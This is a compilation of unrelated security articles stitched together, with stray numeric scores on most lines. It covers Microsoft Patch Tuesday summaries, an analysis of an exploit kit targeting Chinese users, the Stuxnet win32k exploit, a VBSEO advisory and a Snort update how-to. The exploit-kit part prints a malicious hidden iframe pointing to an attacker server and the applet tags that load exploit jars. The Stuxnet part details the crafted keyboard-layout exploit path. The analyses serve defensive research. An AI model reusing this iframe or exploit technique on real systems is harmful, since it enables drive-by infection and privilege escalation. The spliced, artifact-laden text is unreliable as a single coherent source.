If the user of an unpatched computer were to try to open or preview the maldoc, the vulnerability allows the attacker to, in Microsoft’s words, “take control of the affected system,” though there are no specific details explaining how that might happen. The company does add that users with more restrictive permissions are less likely to suffer the worst effects of this vulnerability should it be exploited in the future.
The update for this bug appears in the Monthly Rollup patch packages.
Flash updated, and the FragmentSmack DoS appears
Aside from the critical patches, it’s worth mentioning that Adobe has released an update to the Flash player browser plugin for all browsers and operating systems. The vulnerability this update fixes, involving an information disclosure, is not considered critical but may affect a large number of users, since the plugin is so widely distributed.
In addition, Microsoft published an advisory warning Windows users that they’re also vulnerable to a bug in the Windows network stack that can be used to create a denial-of-service situation. The bug, known informally as FragmentSmack (and officially designated as CVE-2018-5391), affects both Linux and Windows systems and can result in a targeted system’s CPU getting pegged at 100% and the machine becoming unresponsive.
Microsoft published a workaround to FragmentSmack that prevents the situation that causes the DoS from arising, but implementing the changes to block the DoS may also slow down some unstable Internet connections. Administrators should take this into consideration before implementing the workaround; It should only be done where necessary.
Getting updates quicker
The company’s Cumulative Update releases, which bundle together patches that address a number of issues into a single, somewhat large installer, will fix the majority of these (and many more less-severe) bugs. These Cumulative update packages are larger than most because they contain a comprehensive set of updates for packages that may have been patched earlier in other update releases.
But if you’re like some of us in the lab, you may not receive Automatic Updates right away, because of the way Microsoft staggers the release of updates for some users. In those cases, you can (and probably should) make the effort to download and install manually at least the updates that address the critical bugs from the Microsoft Update Catalogue website.
If you plan to download your own updates, and you don’t want to wait for the Windows Update mechanism to decide you deserve a patch, you’ll need to know which version of Windows you’re running, and whether it’s a 32-bit or 64-bit operating system. Click the Start menu and type Run (or hold the Windows key down while pressing the R key), enter winver.exe into the Run dialog box, and take note of the build number you’re running. If you don’t know whether you have a 32-bit (x86) or 64-bit (x64) operating system, right-click My Computer and choose Properties to find out.
Once you know which build and version of Windows you’re using, you can search the Microsoft Update Catalog website, or filter this spreadsheet of September Microsoft update releases, to find the patches you need to install.
Sophos vulnerability protection
While Intercept X doesn’t have any updates targeting the exploitation of vulnerabilities fixed by these updates, that’s to be expected because its protection is centered around the malicious behavior and not the specific exploit methods employed by criminals.
Sophos has released IDS signatures for the Firewall to block the network-based threats described in some of the vulnerability disclosures. The following chart lists the specific SIDs that are tied to individual vulnerability designators.",0.015136804540527238
"CVE
Detection",0.007913038105162418
"CVE-2018-8367
sid:2200888",0.008247687448389773
"CVE-2018-8391
sid:2200887",0.00847735114131376
"CVE-2018-8420
sid:2200886",0.008262082092020173
"CVE-2018-8447
sid:2200889",0.008534848929098726
"CVE-2018-8456
sid:2200885",0.008432029027471089
"CVE-2018-8459
sid:9000751",0.008655905260447683
"CVE-2018-8461
sid:9000752",0.008289491655835812
"CVE-2018-8464
sid:9000753",0.0083784735546093
"CVE-2018-8466
sid:9000754",0.008480812985461994
"CVE-2018-8467
sid:9000755",0.008426157870651263
"SophosLabs thanks researchers Andrew O’Donnell, Jason Zhang, and Mukesh Kumar for their contribution to this report.",0.0137494430819598
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
January 2020 Patch Tuesday delivers fixes for 50 bugs,0.012149822749903394
"This month’s big security news from Microsoft is the end of support for Windows 7, and a patch of a cryptographic library",0.010462667778064372
"Written by
SophosLabs Offensive Security",0.008622298185940958
"January 14, 2020",0.010093330060731764
SophosLabs Uncut Threat Research Chromium Edge Elevation of Privilege Exploits Microsoft Patch Tuesday RDP updates vulnerability Windows,0.007522177428167187
"For the first edition of Patch Tuesday for 2020, Microsoft is fixing a total of 50 security vulnerabilities, 8 of them rated “Critical.” None of the vulnerabilities were reported as being exploited in the wild.
This month also marks the End-of-Life for Windows 7 support – meaning that, from now on, no security updates will be issued on Patch Tuesdays for Windows 7 systems. Needless to say, this puts Windows 7 users at high risk of compromise, at a rate which will only increases as time goes on and unfixed vulnerabilities pile up. The long-overdue upgrade to Windows 10 is highly recommended.
Here’s the patch highlights:
Crypt32.dll fix for digitally signed applications
The crypt32.dll component of Windows is a key piece of the operating system’s immune response: applications and the operating system use this DLL to verify and manage cryptographic digital signatures in applications, among other things. Windows and security tools can use digital signatures to validate whether an application is allowed to run, based on whether the application legitimately originated from the company that created it, as well as to encrypt or decrypt files or messages.
Sophos did not receive any information in advance about the vulnerability Microsoft fixed, but it’s been alleged that the DLL could be abused in such a way that an attacker could spoof the cryptographic certificate used to sign software. If that was the case, the operating system would have no way to tell whether any given application is allowed to run, in the kinds of highly-regulated environments where those certificates are used to “whitelist” applications, and prevent any others from running. According to reporting by Brian Krebs, the bug affects Windows 10 and Windows Server 2016, and was reported to Microsoft by the NSA. This will be the first Patch Tuesday in which Microsoft announces that a Windows bug was reported to them by the normally secretive agency.
While we currently have a research team member reverse-engineering the patch to retroactively figure out what has changed and how it might affect users, we don’t yet know the full nature or scale of the vulnerability. We’ll update SophosLabs Uncut with that information as we obtain it.
Remote Desktop Protocol
Keeping with the trend of vulnerabilities being found and fixed in RDP related software, possibly sparked by last year’s high-profile scare around BlueKeep, this month we are getting 5 bugs fixed in different RDP components:
Remote Desktop Gateway Server – CVE-2020-0609, CVE-2020-0610, CVE-2020-0612
Remote Desktop Web Access – CVE-2020-0637
Remote Desktop Client – CVE-2020-0611
The Remote Desktop Gateway and Web Access services can only be found on Windows Server systems, while the Remote Desktop Client should be present on all Windows editions.
Windows Search Indexer
As an apparent result of a concentrated effort to uncover bugs in the Windows Search Indexer service, a total of 12 security bugs were discovered in this subsystem and subsequently fixed by Microsoft. These bugs fall under the Elevation of Privilege classification.
An attacker with limited access to a system may exploit this type of vulnerabilities to gain more control over an affected system.
In this case, an attacker with non-admin access to the system may exploit these bugs to elevate his privilege level to that of the Search Indexer service – NT AUTHORITY\SYSTEM.
Web Browsers
In sharp contrast to the usual fair amount of browser-related bugs that get fixed on a Patch Tuesday, only a single one is being addressed this month: CVE-2020-0640, Memory corruption in Internet Explorer.
We would like to use the stage of this uneventful browser section to spread the news about the launch of Edge Chromium.
Edge Chromium is an evolution of the Microsoft Edge browser, replacing the software engines it was based on from the original Microsoft-made ones, to those of Google Chrome’s. This month’s patch will automatically deploy this new version of Edge in place of the old one, on Windows Home and Pro editions.
Security-wise, this should be a considerable improvement as it is empirically evident that the Microsoft engines were more vulnerability-prone.
Sophos detection guidance
Sophos has released following detection to detect exploits against the “Windows Common Log File System Driver Elevation of Privilege Vulnerability,” patched today. Please note that additional vulnerabilities and corresponding detection may be released in the future. We will update this post if that is the case.
Additional IPS signatures released",0.01758213665445063
"CVE
Sid",0.008741579345108219
"CVE-2020-0634
90001059",0.009343409485796927
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. Please note that some detection might not be available due to the availability of the data.",0.010783508465219027
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"3
",0.009865182153086294
"Critical fixes to Exchange, Excel in the final Patch Tuesday release of 2020",0.008290283534436282
Microsoft rated ten of the 22 remote code execution vulnerabilities fixed this month as critical fixes,0.01010102255738543
"Written by
Andrew Brandt,",0.009161029206781302
SophosLabs Offensive Security,0.008990065059669039
"December 08, 2020",0.0093486288298259
SophosLabs Uncut 2020-12 CVE-2020-17144 Exchange vulnerability Patch Tuesday PoC proof-of-concept Windows,0.007021732016969873
"The final patch Tuesday release from Microsoft for 2020 squashes only the second-fewest number of bugs of the year, but the ones the company chose to repair include some of the most serious vulnerabilities the company has fixed in the past 12 months. Attackers who target the remote code execution vulnerabilities found in some of Microsoft’s premiere enterprise products, including Sharepoint and a (now outdated) version of Exchange, may be more likely to succeed because the weaknesses in both products are the result of logic bugs, which require less effort to discover and exploit than things like, for instance, memory corruption vulnerabilities.",0.008273550477153502
"December’s collection of 56 fixes is second-smallest to the release at the beginning of the year, in January, when the company patched 50 bugs.
But don’t let the small number of fixes lull you into a sense of complacency. Nearly 40% of this month’s bugs can lead to attackers being able to launch malicious code on targeted systems. Thirty Microsoft products or Windows subsystems got updates today, with the Windows Backup Engine getting the most fixes (repairing seven privilege escalation bugs) for a single process. Microsoft’s Excel spreadsheet software, for example, receives fixes for six remote code execution bugs.
The tally for all bugs fixed in 2020 by Microsoft stands as 1245, averaging more than 100 updates per month over the past year. December’s collection seems paltry by comparison
The SophosLabs Offensive Security Team has already demonstrated a proof-of-concept exploit against one of three  Exchange remote code execution vulnerabilities (CVE-2020-17144) fixed this month. If successfully exploited, this bug permits the attacker to gain access to the full content of email stored on the targeted Exchange server.",0.012083467545631832
"As with all Patch Tuesdays, Microsoft publishes a detailed writeup about major fixes on their Security Updates page. The availability of patches does not mean that your computer will install it quickly, enough. To find and download this month’s Cumulative Update patch yourself, search for the term “2020-12” at the Microsoft Update Catalog website and select the monthly security rollup that matches your computer’s CPU architecture and build of Windows. You can also read the full technical details about each patch on December’s Security Updates Guide.
What follows are notes about some of the more critically important fixes released this month.
Windows NTFS Remote Code Execution Vulnerability
CVE-2020-17096
NTFS is the standard file system used in all modern Windows products, but it might surprise you that it has been in use since it was introduced in 1993 as part of Windows 3.1. This month’s fix addresses a bug present in the NTFS filesystem driver code. An attacker with access to perform low-level filesystem operations may trigger a stack memory corruption on an affected system.
There are two main ways an attacker may obtain or use such access:",0.010680561562349533
"When an attacker exploits the bug remotely, by way of interacting with file shares on a remote Windows machine using the SMB2 protocol, they may be able to engage in remote code execution.
If the attacker can execute a malicious exploit program targeting a vulnerable computer running Windows, using this exploit they may be able to perform a local privilege escalation, as well.",0.014638955902616546
"The former is, obviously, the most serious scenario. However as a general rule accessing a file share requires the attacker to have valid user credentials to the remote system. For a determined attacker who knows what they’re doing, this may not pose much of an impediment, but it’s likely beyond the capacity of an amateurish, opportunistic attacker.
In any case, successful exploitation of the stack memory corruption condition may lead to arbitrary code execution. Since the vulnerable code is running in the context of a Windows Kernel driver, this means a powerful compromise with the capability to easily circumvent many kinds of software, including (but not limited to) endpoint protection.
Microsoft SharePoint Remote Code Execution Vulnerability
CVE-2020-17121
Sharepoint suffers from a directory traversal vulnerability that may be triggered when it processes an attacker’s malicious input. An attacker may use this vulnerability to cause an unsafe deserialization of malicious input, ultimately leading to remote code execution.
In order to execute the attack, the attacker requires valid user credentials to the target SharePoint site, in order to log into it and create a new Team Site on it. Gaining useful credentials is an impediment to casual attackers and prevents them from leveraging the bug without taking additional steps.
Since the bug in question is a ‘logic’ type bug (as opposed to a memory corruption bug) it can be reliably exploited without having to account for unpredictable conditions, earning it an “Exploitation More Likely” rating from Microsoft.
Successful exploitation of this vulnerability can lead to the compromise of the system hosting the SharePoint server, which in turn can reveal sensitive files or data to the attacker.
Microsoft Exchange Remote Code Execution Vulnerability
CVE-2020-17144
While this is a quite serious vulnerability, the potential risk it poses is mitigated for two reasons: It only affects the Exchange 2010 mail server, for which Microsoft recently ended all support, and it requires the attacker to have valid account credentials for at least one email user on the affected server. The user doesn’t need to have administrative access.
An email user may upload a malicious configuration file to the Exchange server, on which the server proceeds to perform an unsafe deserialization. An attacker may exploit this condition to execute arbitrary code on the affected server, in the context of the privileged Exchange service process MSExchangeMailboxAssistants.exe, resulting in compromise of the server. Supplying this malicious configuration file requires the attacker to have valid email account credentials on the affected mail server.
Once the server is compromised, it exposes the contents of the mailboxes used by all accounts on the Exchange server to the attacker.
In some cases the same system running the Exchange server also hosts other sensitive or critical components or services,. For instance, an Exchange server doing double-duty as as a Domain Controller could lead to even worse consequences. As with the previously referenced Sharepoint bug, CVE-2020-17144 is also a logic bug and therefore easier for an attacker to discover and take advantage of the vulnerability.
Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.014473925108551167
CVE,0.015603552773460372
SAV,0.007429604172777826
IPS,0.010146075287656875
"CVE-2020-17096
N/A
SID:2304630",0.010501848555536597
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Unusual Exploit Kit Targets Chinese Users (Part 1)
We are very accustomed to seeing the same exploit kits over and over. Angler EK, Nuclear EK or Fiesta EK all have become familiar faces on this blog.
Today, we are looking at an exploit kit that we have not seen before. Contrary to its counterparts, it is not used on mainstream websites or via malvertising attacks but rather it specifically targets Chinese websites and users.
The point of entry is hidden within compromised Chinese websites which have been injected with a malicious iframe. Simply browsing to any of these pages will trigger the drive-by download attack onto vulnerable systems.
As with other exploit kits, this one fingerprints potential victims and fires the appropriate exploits, except with one difference in that it checks for the presence of a popular Chinese antivirus product before committing itself.
The exploit toolkit was found on at least two different servers, one located in Malaysia and the other in Singapore. They also host the malware binaries delivered via HTTP or FTP depending on the exploitation technique.
In this two-part blog series, we will describe the methods used by the attackers to draw victims and compromise them via multiple exploits and scripts before infecting them with malware payloads.
Exploit Kit Analysis
There are multiple aspects to this attack, starting with the compromise of an unknown number of Chinese websites with a malicious iframe pointing directly to the exploit kit.
The kit itself validates the user before exploiting one or more browser plugins. As far as we could tell, only existing and already patched vulnerabilities are used in this attack.
Infection vector
We discovered the initial infection vector on a compromised Chinese website that contained a specific iframe:
Website security firm Sucuri also identified additional ones (here and there) via their SiteCheck service:",0.013951523417120582
"The malicious iframe points to a JavaScript file hosted on the root of a server who’s IP address is located in Malaysia:
<i f r a m e name='z4Pdb4sl' src='hxxp://101.99.68.18/jquery.min.js' width='1' height='1' scrolling='no' style='border: 0px #000000 hidden; margin: 0px; padding: 0px;'>
The same URL also exists on a server in Singapore: 202.172.54.119/jquery.min.js
It’s worth noting that the name the malware authors picked (jquery.min.js) is the name of a legitimate library called jQuery. It is common for websites to reference third party URLs to load external APIs and libraries.
However, in this case the file has nothing to do with jQuery and instead is an exploit kit landing page.
Exploit kit overview
Exploit kit servers
IP records (courtesy of Robtex):",0.009921370517233519
"As is the case with most exploit kits, this one contains the same primary elements:",0.01581341020616478
"A landing page
Various exploits
Malware payloads",0.007004172243257445
Traffic and URL structure (Fiddler capture),0.01706881351398215
"Surprisingly, none of the code base is encrypted. Most modern (if not all) exploit kits heavily encode their scripts to prevent easy reverse engineering but this one doesn’t.
Landing page
The code for the landing page is quite straightforward and does the typical ‘fingerprinting’ calls to determine what the victim is running.
Browser detection",0.016143348522661416
Java detection in Internet Explorer,0.007583843089099429
Java detection in Firefox,0.007509542727849983
Flash Player detection,0.007893168251460358
Silverlight detection,0.00826425941418174
"Anti AV detection
Using the XMLDOM exploit (CVE ), the landing page looks for the presence of Qihoo 360 Total Security:",0.008453888330892778
Qihoo 360 Technology is a very large Chinese Internet company boasting close to 500 million active users. The exploit kit will not continue with its payload if it detects the user is running the Qihoo antivirus.,0.011058120633523294
"Exploit files
We noticed three different types of files that tried to download the final payload:",0.009613985026388439
"Java exploits (CVE-2011-3544 and CVE-2012-4681)
Internet Explorer exploit (CVE-2014-6332)
Flash exploit (CVE-2015-0311 thanks @ropchain)",0.013539892274770371
"Java exploits
The Java applets (VacnaHohoyg4.jar, kflrtGp.jar) are called via sub pages:
<h t m l><head></head><body><applet archive=""VacnaHohoyg4.jar"" code=""EF6UT.class"" width=""1"" height=""1""></applet></body></h t m l>
<h t m l><head></head><body><applet archive=""kflrtGp.jar"" code=""Nu8qU.class"" width=""1"" height=""1""></applet></body></h t m l>
CVE-2011-3544",0.00958354730611466
CVE-2012-4681,0.00963482802645177
"Once again, the applets are not even encrypted and we can clearly see the call to the malware binary which it retrieves from the same server. They made a bit of effort to disguise the file name pretending it is a “.jpg”",0.012270177195757848
Malwarebytes Anti-Exploit blocks this exploit:,0.008566472128133329
"Internet Explorer (CVE-2014-6332)
There is heavy use of multiple VBS scripts in this exploit kit. One that stroke our attention used Wscript to download a malware binary from the server, but, strangely, via FTP:",0.011845239193026491
Malwarebytes Anti-Exploit blocks this exploit:,0.008566472128133329
"Even more bizarre (and careless) is the presence of the FTP script containing the username and password, in clear text:",0.007836641175839043
"Flash exploit
File: kTjAhKzI.swf",0.006090072514916667
Malwarebytes Anti-Exploit blocks this exploit:,0.008566472128133329
Malware files,0.0072998505235037925
"image.png (MD5: 55c447191d9566c7442e25c4caf0d2fe)
pic.jpg (MD5: 4e8639378d7a302c7474b5e4406dd7b4)
notepad.exe (MD5: 5a454c795eccf94bf6213fcc4ee65e6d)",0.015269847105279566
"In a follow-up blog post, we will analyze the malware drops and in particular what their purpose is.
Conclusion (Part 1)
The author(s) of this exploit kit did not really invest much effort into hiding their code or even their own credentials, blunders that professionals would not make.
The kit is hosted directly on fairly unsecure servers located (as far as we know) in the Asia Pacific region. Other Asian exploit kits come to mind (Gondad and CK VIP EK) but those two were more sophisticated than this one, although it is possible that the author got inspired by them.
The exploit code is fairly straightforward and mostly aimed at older computers (with the exception of the Flash exploit). But considering the targeted users, this might not be a problem.
According to data from Zhongguancun Online, the vast majority of Chinese PC users, roughly 200 million, or 70 percent, are running Windows XP. A quote from that Reuters article is particularly interesting: “Qihoo 360 will continue to provide Windows XP support to Chinese users as long as there are still XP users in China.”
This makes sense with the authors of this exploit kit deciding to detect the presence of the Qihoo antivirus and avoiding it. There would still be a large number of users running vulnerable computers with little to no protection at all.
Stay tuned for the follow-up to this story where we dig into the actual purpose of this exploit kit, since it really only is the vehicle for the bad guys’ objective: compromising end-user systems.
",0.014401277641311272
"Top reason to apply October, 2020’s Microsoft patches: Ping of Death Redux",0.009027601475105618
A vulnerability in Windows' TCP/IP driver handling of IPv6 allows denial of service—and possibly remote code execution.,0.011178828248365691
"Written by
SophosLabs Offensive Security",0.008622298185940958
"October 13, 2020",0.009940982610850635
SophosLabs Uncut 2020-10 CVE-2020-16891 CVE-2020-16898 CVE-2020-16911 CVE-2020-16915 CVE-2020-16923 CVE-2020-16947 CVE-2020-16951 CVE-2020-16952 CVE-2020-16966 Microsoft Patch Tuesday,0.013263231384541552
"Microsoft is releasing a substantial number of security fixes again in October’s Patch Tuesday release—with 11 rated “Critical” by Microsoft (including the latest Adobe Flash security update). But two vulnerabilities among those being patched stand out above these others: CVE-2020-16898 and CVE-2020-16899. These vulnerabilities—caused by a bug in Windows’ TCP/IP driver—harken back to the “Ping of Death” vulnerability fixed in Windows in 2013. They make denial of service and potential remote code execution possible with a crafted packet.
The vulnerability in tcpip.sys, a logic error in how the driver parses ICMP messages, can be triggered remotely with a crafted IPv6 router advertisement packet containing a Recursive DNS Server (RDNSS) option. The RDNSS option typically contains a list of the IPv6 addresses of one or more recursive DNS servers.
The RDNSS option format for IPv6 ICMP packets.
There is a logic flaw in tcpip.sys that can be exploited by crafting a router advertisement packet containing more data than expected, which results in the driver putting more bytes of data on its memory stack than provided for in the driver’s code, resulting in a buffer overflow. In theory, this could be used for both denial of service and remote code execution attacks. But in practice, achieving remote code execution would be extremely difficult.
SophosLabs developed its own proof-of-concept for an attack, based on information provided by Microsoft. It leverages the vulnerability to cause a “blue screen of death” on the targeted computer.  The details of the POC are being withheld to prevent exploitation by attackers.",0.01166483723053724
"Once we understood the bug, developing a “Blue Screen of Death” proof-of-concept was fairly straightforward. But taking it to the level that Microsoft has warned is possible—remote code execution (RCE)—is not. Modern defensive coding standards and practices would slow down an effort to build a reliable generic RCE exploit, for two reasons.
First, TcpIp.sys is compiled with GS flag— which prevents a typical stack overflow from directly controlling the return address.",0.008624959159058254
"The stack cookie, also known as a stack canary, is a random value generate at loading time. Its value is XOR’d with the stack pointer, making it extremely hard to predict reliably—especially in a full remote exploitation.",0.01067421504329702
"There are two typical techniques used to bypass stack canaries, neither of which really apply in this case:",0.011808862354116934
"Using another information leak vulnerability (arbitrary read)—which won’t help much in exploiting tcpdrv.sys, because the canary value is XOR’d with the stack pointer.
Overwriting a Structured Exception Handling (SEH) handler, which would be useful only if a structured exception record has been set—which is not the case here.",0.011916941895914746
"The second roadblock to an effective RCE exploit is kernel Address Space Layout Randomization (kASLR). Even if it was possible can reliably predict the stack canary (big if) landing back to a system shell in user mode would require to correctly (and again remotely) determine the base address of the Windows kernel.
That means that even when the exact nature of the bug in tcpdrv.sys becomes more widely known, it may be some time before anyone can exploit it in a way that reliably injects code into the Windows kernel space. Even so, the threat of denial of service at will with a relatively easily-crafted packet should be enough by itself to prompt rapid patching—which is the only real fix for this vulnerability.
Sophos is in the process of deploying signatures for attacks based on this vulnerability to XG Firewall and Endpoint IPS (in EAP). The signature IDs are sid:2304055 and sid:2304163, respectively. Other short-term mitigations fir potential denial of service attacks include:",0.009413208041375243
"Disable IPv6 if not used, or
Make Windows discard router advertisement packets using the netsh command (netsh int ipv6 set int *INTERFACENUMBER* rabaseddnsconfig=disable).",0.014961491468319155
The rest of this month’s critical vulnerabilities patched are all potential remote code execution bugs as well:,0.007809432854766318
"CVE-2020-16891: Windows Hyper-V Remote Code Execution Vulnerability
CVE-2020-16911: GDI+ Remote Code Execution Vulnerability
CVE-2020-16915: Media Foundation Memory Corruption Vulnerability
CVE-2020-16923: Microsoft Graphics Components Remote Code Execution Vulnerability
CVE-2020-16947: Microsoft Outlook Remote Code Execution Vulnerability
CVE-2020-16951 and CVE-2020-16952: two Microsoft SharePoint Remote Code Execution Vulnerabilities
CVE-2020-16966: Open Enclave SDK Remote Code Execution Vulnerability
CVE-2020-16967: Windows Camera Codec Pack Remote Code Execution Vulnerability",0.019518989086394267
"Windows Spoofing Vulnerability
Another interesting bug fixed in this Patch Tuesday’s release is CVE-2020-16922 , a bug in Windows’ verification of digital signatures of Security Catalog (.CAT) files that could potentially be used to spoof verification of trust for a potentially malicious file.
Normally, any modification done to a digitally signed file should result in the invalidation of its signature.  However, it was discovered that appending arbitrary data of any size onto the end of a signed .CAT file does not invalidate its signature in the eyes of Windows, which fails to account for the extraneous data.
This bug bears a resemblance to the Curveball vulnerability from earlier this year, but is not as critical and poses a lesser threat to users—because unlike with Curveball,  “Man-in-the-Middle” attacks are not of concern. The bug could be exploited in malware deployments, however—for example, in the crafting of a  malicious Java Archive (.JAR) file.
By taking an existing Microsoft-signed .CAT file, appending the contents of a .JAR file to it, and changing the file’s extension to .JAR, a file is produced that looks and runs like a .JAR file, but has a “spoofed”, valid digital signature. This works because the Java Runtime will search a given .JAR file for Java contents to execute, even if they are present in the middle of the file.
Most other file types do not work this way, and cannot be abused for this purpose. Attackers might use this type of vulnerability to circumvent security software around their handling of malware: a file with a spoofed digital signature can fool security software into regarding it as a legitimate Microsoft-made file and therefore increase its “reputation,” potentially to such an extent that a blind eye would be turned to an actual malware file that would have otherwise get detected.
Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.010892278040609105
CVE,0.015603552773460372
IPS,0.010146075287656875
"CVE-2020-16898
SID:2304055,2304163",0.010228578898357377
"CVE-2020-16899
SID:2304058",0.00938951320406678
"CVE-2020-16922
SID:2304140,2304142",0.010193582954348135
"CVE-2020-16915
SID:2304212",0.010026655792423567
This and all the other vulnerabilities revealed in October’s Patch Tuesday release—especially the critical ones—offer plenty of reasons to patch as quickly as possible.,0.011747623186023848
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Win32k.sys: A Patched Stuxnet Exploit
...we also indicated in that paper that there are two Elevation of Privilege (EoP) vulnerabilities that we chose not to describe while patches were pending. One of these has now been patched, so we’re now able to publish some of the information we have on it. (When the other vulnerability has been patched, we plan to update the Stuxnet paper with information on both issues.)",0.012113521296609808
15 Oct 2010 - 02:00AM,0.010974675927398314
"…we also indicated in that paper that there are two Elevation of Privilege (EoP) vulnerabilities that we chose not to describe while patches were pending. One of these has now been patched, so we’re now able to publish some of the information we have on it. (When the other vulnerability has been patched, we plan to update the Stuxnet paper with information on both issues.)",0.011839532622312077
"While the LNK vulnerability patched by MS10-046 dominated the headlines when the Stuxnet carnival started rolling back in early summer 2010, one of the surprises of further analysis of the Stuxnet binaries/components is that it exploited no less than three other vulnerabilities that were generally unknown at the time. The print spooler attack (MS10-61) is, like the LNK vulnerability, described in our lengthy analysis “Stuxnet under the Microscope”.",0.012684956271137304
"However, we also indicated in that paper that there are two Elevation of Privilege (EoP) vulnerabilities that we chose not to describe while patches were pending. One of these has now been patched (MS10-073, re CVE-2010-2743) , so we’re now able to publish some of the information we have on it. (When the other vulnerability has been patched, we plan to update the Stuxnet paper with information on both issues.)",0.01167027326852077
"When the Win32/Stuxnet worm doesn’t have enough privileges to install itself in the system it exploits a recently patched 0-day vulnerability in the win32k.sys system module to escalate privilege level up to SYSTEM, which enables it to perform any tasks it likes on the local machine. The vulnerable systems are:",0.010582588917513736
"Microsoft Windows 2000;
Windows XP – all service packs",0.009551671582458288
"To perform this trick, it loads a specially crafted keyboard layout file, making it possible to execute arbitrary code with SYSTEM privileges. This elevation of privilege occurs while dispatching input from the keyboard in the Win32k.sys module. While processing input from the keyboard using the NtUserSendInput system service, the following code is executed:",0.013304364159138715
Figure 1: A fragment of the executed code during processing keyboard input,0.008817947461271847
"The purpose of this code is to determine how to dispatch the virtual key code of the pressed key. Register ecx specifies in the _aNLSVKProc procedure table the type of the handler, according to the current keyboard layout. to be called. This table consists of three handlers:",0.01516299416480471
Figure 2: _aNLSVKProc procedure table,0.009038289467295568
"As we can see from the figure above, the _aNLSVKProc is followed by 3 DWORDs, the last of which (highlighted in red) can be interpreted as a pointer pointing to  0x60636261 in the user-mode address space. Thus, if we set the ecx register in the code in figure 1 with the proper value, namely 5, then we can execute code at  0x6036261 with SYSTEM privileges.",0.012979481745104215
We can manipulate the ecx register in this code by loading a specially crafted keyboard layout file specifying that certain virtual key codes should call the procedure indexed as 5. The keyboard layout file is a dynamic link library of which the .data section is specially structured. Below we present a structure that maps virtual keys to corresponding procedures in the table.,0.010681824870903411
Figure 3: Virtual keymapping,0.008561376455243908
"The worm loads a special keyboard layout file by calling NtUserLoadKeyboardLayoutEx and passing it the following hexadecimal constant 0x01AE0160 as an offTable parameter. The low word of this parameter specifies the RVA (Relative Virtual Address) of the KBDTABLES structure from the beginning of the file, while the high word specifies the RVA of KBDNLSTABLES, which is of particular interest. The latter structure determines the address and size of the array of VK_F structures contained in the file.",0.011395953789394953
Figure 4: VK_F structure,0.010138931773666426
In the figure below we present the contents of the .data section where we can see that the structure KBDNLSTABLES located at RVA 0x1AE specifies one structure VK_F located at RVA 0x01C2.,0.01460540077705752
Figure 5: .data section of the crafted keyboard layout file,0.007249206263257868
"As we can see, the keyboard layout file contains exactly one VK_F structure that maps a virtual-key with code equal to procedure 0 in _aNLSVKProc with indexed as 5.",0.011011185293398729
"One thing we need to do in order to exploit this vulnerability is to allocate a buffer for the code to be executed at address 0x60636261 as in the case with Stuxnet, which allocates 32KB of memory at 0x60630000 and writes shell code at 0x60636261:",0.008785112692703545
Figure 6: Stuxnet allocates 32KB of memory at 0x60630000 for shell code,0.00846837697146019
"Aleksandr Matrosov
Eugene Rodionov
Juraj Malcho
David Harley
",0.011040803284605216
Serious Vulnerability in VBSEO,0.006515953305516464
"The vBulletin team sent an email yesterday to all their clients about a potential security vulnerability in VBSEO. VBSEO is a widely used SEO module for vBulletin that was discontinued last year. This makes the problem worse, as no patches will be released for it.
If you are using VBSEO, you have 3 options:",0.013095219371543454
"Completely remove VBSEO from your site – It is not supported anymore
Apply the patch recommended by the vBulletin team
Put your site behind a Website Firewall, this will prevent the exploitation of this vulnerability and many others.",0.009531276189480242
"Our research team is looking at this issue and it seems to be a remote, unauthenticated script (HTML) injection vulnerability. It might lead to a full remote command execution, but we have not confirmed it yet. That’s as serious as it can get, since an attacker can use that to inject malware, spam or take down the site.
Update: We have since confirmed that remote code execution vulnerability does in fact exist, which is why the following recommendations should be followed immediately for all affected VBSEO websites.",0.008540023093427496
"This is the full email from vBulletin:
Dear VB License Holder,
It has come to our attention that there may be a potential security vulnerability in VBSEO affecting the latest version of the software (and potentially other versions as well). We’ve attempted to contact the vendor, but as they have been non-responsive we felt we should alert the community as many of our customers use this add-on software.
If you think you might be running a vulnerable version of the software, there is a simple fix: just comment out the following lines in the file vbseo/includes/functions_vbseo_hook.php:
if(isset($_REQUEST[‘ajax’]) && isset($_SERVER[‘HTTP_REFERER’]))
$permalinkurl = $_SERVER[‘HTTP_REFERER’].$permalinkurl;
should be changed to:
// if(isset($_REQUEST[‘ajax’]) && isset($_SERVER[‘HTTP_REFERER’]))
// $permalinkurl = $_SERVER[‘HTTP_REFERER’].$permalinkurl;
If you are running the “Suspect File Versions” diagnostics tool, you will additionally need to generate a new MD5 sum of the above file and edit upload/includes/md5_sums_crawlability_vbseo.php to use the new MD5 sum on the line:
Please be aware that you are making these changes at your own risk. We don’t know if making this change affects the terms of your VBSEO license and we can’t be responsible if making this change breaks your site.
CVE-2014-9463 has been assigned to this potential vulnerability by cve.mitre.org.
We will post more details as we investigate.
",0.010088446345603352
Using Oinkmaster to Update Snort Rules,0.009007197407486789
Get link,0.00875442411000149
Facebook,0.011690316117642374
Twitter,0.00956892365716755
Pinterest,0.008890873884770167
Email,0.009317642269235038
Other Apps,0.009765233287938546
"July 11, 2004",0.00903975869952578
"I've never explained how I like to keep Snort rules updated on my sensors.  The tool of choice for automatic rule updates is Andreas Ostling's Oinkmaster, a Perl script.  Here is a sample run.  First I make a temporary directory to hold old Snort rules files, then download and extract the snapshot version of Oinkmaster.  (Oinkmaster 1.0 was released in May, but the snapshot includes some improvements discussed in the oinkmaster-users mailing list.)",0.010827577991785797
"[root@sensor root]# mkdir /tmp/oldrules
[root@sensor root]# cd /usr/local/src
[root@sensor src]# wget http://oinkmaster.sourceforge.net/oinkmaster-snapshot.tar.gz
--15:05:14--  http://oinkmaster.sourceforge.net/oinkmaster-snapshot.tar.gz
=> `oinkmaster-snapshot.tar.gz'
Resolving oinkmaster.sourceforge.net... done.
Connecting to oinkmaster.sourceforge.net[66.35.250.209]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68,234 [application/x-tar]",0.013041087234394788
